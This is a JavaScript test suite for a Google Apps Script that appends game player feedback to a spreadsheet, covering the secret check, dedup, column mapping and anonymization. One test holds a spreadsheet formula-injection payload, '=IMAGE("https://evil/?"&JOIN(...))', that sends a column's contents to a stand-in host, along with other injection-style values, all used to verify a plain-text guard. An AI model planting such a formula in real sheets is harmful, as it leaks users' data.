'use strict';
// ops/feedback/apps_script.gs (RJ 489), run in a vm against stand-ins for the Apps Script services: the secret, the
// header lookup, dedup by Feedback ID, plain-text writes (the formula-injection guard), dates, the columns it must
// never write, and anonymize. Each change to the script costs Alex a redeploy, so it is checked here first.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const crypto = require('crypto');
const { HEADERS } = require('../src/feedback/sheetRow');

const SOURCE = fs.readFileSync(path.join(__dirname, '..', 'ops', 'feedback', 'apps_script.gs'), 'utf8');
const DEV = 'aa'.repeat(32);
const ALPHA = 'bb'.repeat(32);

// A tab: cells[r][c] = {value, format, raw} (1-based); `writes` logs every write's columns.
function fakeTab(headers) {
  const cells = [];
  const writes = [];
  const at = (r, c) => {
    cells[r] = cells[r] || [];
    cells[r][c] = cells[r][c] || { value: '', format: '' };
    return cells[r][c];
  };
  const stored = (v) => (typeof v === 'string' && v.startsWith("'") ? v.slice(1) : v);
  const display = (v) => (v instanceof Date ? v.toISOString() : String(v));
  headers.forEach((h, i) => { at(1, i + 1).value = h; });
  const tab = {
    cells, writes,
    getLastRow: () => cells.reduce((m, row, r) => (row && row.some((c) => c && c.value !== '') ? r : m), 0),
    getLastColumn: () => Math.max(0, ...cells.filter(Boolean).map((row) => row.reduce((m, c, i) => (c && c.value !== '' ? i : m), 0))),
    getParent: () => ({ getSpreadsheetTimeZone: () => 'America/Los_Angeles' }),
    getRange(r, c, nr = 1, nc = 1) {
      const each = (fn) => {
        for (let i = 0; i < nr; i++) for (let j = 0; j < nc; j++) fn(at(r + i, c + j), i, j);
      };
      return {
        getDisplayValues() {
          const out = [];
          for (let i = 0; i < nr; i++) {
            out.push([]);
            for (let j = 0; j < nc; j++) out[i].push(display(at(r + i, c + j).value));
          }
          return out;
        },
        setNumberFormats(f) { each((cell, i, j) => { cell.format = f[i][j]; }); },
        setNumberFormat(f) { each((cell) => { cell.format = f; }); },
        setValues(v) {
          writes.push({ row: r, cols: Array.from({ length: nc }, (_, j) => c + j) });
          each((cell, i, j) => { cell.raw = v[i][j]; cell.value = stored(v[i][j]); });
        },
        setValue(v) {
          writes.push({ row: r, cols: [c] });
          each((cell) => { cell.raw = v; cell.value = stored(v); });
        },
      };
    },
  };
  return tab;
}

function load({ headers = HEADERS, props = { RJ_SHEET_ID: 'sheet-id', RJ_FEEDBACK_SECRET: `${DEV}, ${ALPHA}` }, lockFree = true } = {}) {
  const tab = fakeTab(headers);
  const sandbox = {
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => (k in props ? props[k] : null) }) },
    LockService: { getScriptLock: () => ({ tryLock: () => lockFree, releaseLock() {} }) },
    SpreadsheetApp: { openById: (id) => ({ getSheetByName: (n) => (id === 'sheet-id' && n === 'Player Feedback' ? tab : null) }) },
    Utilities: {
      DigestAlgorithm: { SHA_256: 'sha256' }, Charset: { UTF_8: 'utf8' },
      computeDigest: (alg, s) => [...crypto.createHash('sha256').update(s, 'utf8').digest()].map((b) => (b > 127 ? b - 256 : b)),
    },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: (s) => ({ text: s, setMimeType(m) { this.mime = m; return this; } }),
    },
    Logger: { log() {} },
  };
  vm.createContext(sandbox);
  vm.runInContext(SOURCE, sandbox);
  const post = (body) => {
    const out = sandbox.doPost({ postData: { contents: typeof body === 'string' ? body : JSON.stringify(body) } });
    assert.equal(out.mime, 'json');
    return JSON.parse(out.text);
  };
  return { post, tab, sandbox };
}

let seq = 0;
const id = () => `22222222-0000-4000-8000-${String(++seq).padStart(12, '0')}`;
function row(over = {}) {
  return {
    Received: '2026-10-14T18:00:00.000Z', Written: '2026-10-14T17:59:58Z', Env: 'dev', Tags: 'bug', Feedback: 'hello',
    Player: 'anonymous', Where: 'main_menu', Build: 120, Platform: 'android', Device: 'Pixel', 'Run / match': '',
    'Feedback ID': id(), Context: '{}', ...over,
  };
}
const col = (name) => HEADERS.indexOf(name) + 1;

test('a wrong, missing or empty secret is denied; either environment\'s secret is accepted', () => {
  const { post, tab } = load();
  for (const secret of [undefined, '', 'x', DEV.slice(1), `${DEV}x`, 42]) {
    assert.deepEqual(post({ secret, op: 'append', rows: [row()] }), { ok: false, error: 'denied' }, String(secret));
  }
  assert.equal(tab.writes.length, 0);
  assert.equal(post({ secret: DEV, op: 'append', rows: [row()] }).ok, true);
  assert.equal(post({ secret: ALPHA, op: 'append', rows: [row()] }).ok, true);
  assert.deepEqual(post('not json'), { ok: false, error: 'not JSON' });
  assert.deepEqual(load({ props: { RJ_SHEET_ID: 'sheet-id' } }).post({ secret: '', op: 'append', rows: [] }), { ok: false, error: 'denied' }, 'no secret set: nobody gets in');
});

test('append writes every string as plain text: "@" format and a leading apostrophe; dates and Build typed', () => {
  const { post, tab } = load();
  const evil = '=IMAGE("https://evil/?"&JOIN(",",A:A))';
  const r = row({ Feedback: evil, Player: '+cmd (#3)', Where: '@x', Device: '-1', Context: '{"a":"=1+1"}' });
  const ans = post({ secret: DEV, op: 'append', rows: [r] });
  assert.deepEqual(ans, { ok: true, ids: [r['Feedback ID']] });
  const cell = (name) => tab.cells[2][col(name)];
  for (const name of ['Env', 'Tags', 'Feedback', 'Player', 'Where', 'Platform', 'Device', 'Feedback ID', 'Context']) {
    assert.equal(cell(name).format, '@', name);
    assert.equal(cell(name).raw, `'${r[name]}`, name);
  }
  assert.equal(cell('Feedback').value, evil, 'stored as the text itself');
  assert.ok(cell('Received').raw instanceof Date || Object.prototype.toString.call(cell('Received').raw) === '[object Date]');
  assert.equal(cell('Received').raw.toISOString(), '2026-10-14T18:00:00.000Z');
  assert.equal(cell('Received').format, 'yyyy-mm-dd hh:mm:ss');
  assert.equal(cell('Written').raw.toISOString(), '2026-10-14T17:59:58.000Z');
  assert.deepEqual([cell('Build').raw, cell('Build').format], [120, '0']);
  assert.deepEqual([cell('Run / match').raw, cell('Run / match').format], ['', '@'], 'empty stays empty');
});

test('a Written that does not parse stays text; a Build that is not a number is text', () => {
  const { post, tab } = load();
  post({ secret: DEV, op: 'append', rows: [row({ Written: 'yesterday', Build: '' }), row({ Written: '=NOW()' })] });
  assert.deepEqual([tab.cells[2][col('Written')].raw, tab.cells[2][col('Written')].format], ["'yesterday", '@']);
  assert.deepEqual([tab.cells[2][col('Build')].raw, tab.cells[2][col('Build')].format], ['', '@']);
  assert.equal(tab.cells[3][col('Written')].raw, "'=NOW()");
});

test('dedup by Feedback ID: a retry appends nothing, and the answer still holds every id', () => {
  const { post, tab } = load();
  const a = row();
  const b = row();
  post({ secret: DEV, op: 'append', rows: [a] });
  const ans = post({ secret: DEV, op: 'append', rows: [a, b, b, { 'Feedback ID': 'not-an-id' }] });
  assert.deepEqual(ans, { ok: true, ids: [a['Feedback ID'], b['Feedback ID'], b['Feedback ID']] });
  assert.equal(tab.getLastRow(), 3, 'a once, b once');
  assert.equal(tab.cells[3][col('Feedback ID')].value, b['Feedback ID']);
});

test('columns by header: moved columns, an added one, and Triage / Notes never written', () => {
  const headers = ['Notes', 'Feedback ID', 'Triage', 'Received', 'Feedback', 'Alex col', 'Player', 'Written', 'Env', 'Tags',
    'Where', 'Build', 'Platform', 'Device', 'Run / match', 'Context'];
  const { post, tab } = load({ headers });
  const r = row({ Feedback: 'moved' });
  post({ secret: DEV, op: 'append', rows: [r] });
  const c = (name) => headers.indexOf(name) + 1;
  assert.equal(tab.cells[2][c('Feedback')].value, 'moved');
  assert.equal(tab.cells[2][c('Feedback ID')].value, r['Feedback ID']);
  const written = new Set(tab.writes.flatMap((w) => w.cols));
  for (const name of ['Notes', 'Triage', 'Alex col']) assert.ok(!written.has(c(name)), `${name} is never written`);
  assert.equal(tab.writes.length, 3, 'one setValues per run of adjacent columns: [2], [4-5], [7-16]');

  const { post: post2, tab: tab2 } = load();
  post2({ secret: DEV, op: 'append', rows: [row(), row()] });
  assert.equal(tab2.writes.length, 1, 'the tab as set up: one write');
  assert.deepEqual(tab2.writes[0].cols, OUR_COLS());
});

function OUR_COLS() {
  return HEADERS.slice(0, 13).map((h) => col(h));
}

test('anonymize sets Player to "deleted account" and nothing else; an id with no row counts as done', () => {
  const { post, tab } = load();
  const a = row({ Player: 'Ace (#3)' });
  post({ secret: DEV, op: 'append', rows: [a, row({ Player: 'Bee (#4)' })] });
  const gone = id();
  const before = tab.writes.length;
  assert.deepEqual(post({ secret: DEV, op: 'anonymize', rows: [{ 'Feedback ID': a['Feedback ID'] }, { 'Feedback ID': gone }] }),
    { ok: true, ids: [a['Feedback ID'], gone] });
  assert.equal(tab.cells[2][col('Player')].value, 'deleted account');
  assert.equal(tab.cells[3][col('Player')].value, 'Bee (#4)');
  assert.deepEqual(tab.writes.slice(before), [{ row: 2, cols: [col('Player')] }]);
});

test('refusals: no Feedback ID header, too many rows, an unknown op, a missing tab, a held lock', () => {
  assert.deepEqual(load({ headers: ['Received', 'Feedback'] }).post({ secret: DEV, op: 'append', rows: [row()] }),
    { ok: false, error: 'the tab has no "Feedback ID" header' });
  const { post } = load();
  assert.equal(post({ secret: DEV, op: 'append', rows: Array.from({ length: 51 }, () => row()) }).ok, false);
  assert.deepEqual(post({ secret: DEV, op: 'delete', rows: [] }), { ok: false, error: 'unknown op' });
  assert.deepEqual(load({ props: { RJ_SHEET_ID: 'other', RJ_FEEDBACK_SECRET: DEV } }).post({ secret: DEV, op: 'append', rows: [] }),
    { ok: false, error: 'no tab named "Player Feedback"' });
  assert.deepEqual(load({ lockFree: false }).post({ secret: DEV, op: 'append', rows: [] }), { ok: false, error: 'busy' });
});

test('the brain\'s header names are the sheet\'s: every column the forwarder sends is one the script writes', () => {
  const { sheetRow } = require('../src/feedback/sheetRow');
  const sent = Object.keys(sheetRow({ id: 'i', received_at: 'x', context: '{}', tags: '' }));
  const { sandbox } = load();
  assert.deepEqual(sent, [...sandbox.OUR_HEADERS]);
  assert.deepEqual(HEADERS, ['Received', 'Written', 'Env', 'Tags', 'Feedback', 'Player', 'Where', 'Build', 'Platform',
    'Device', 'Run / match', 'Feedback ID', 'Context', 'Triage', 'Notes']);
});
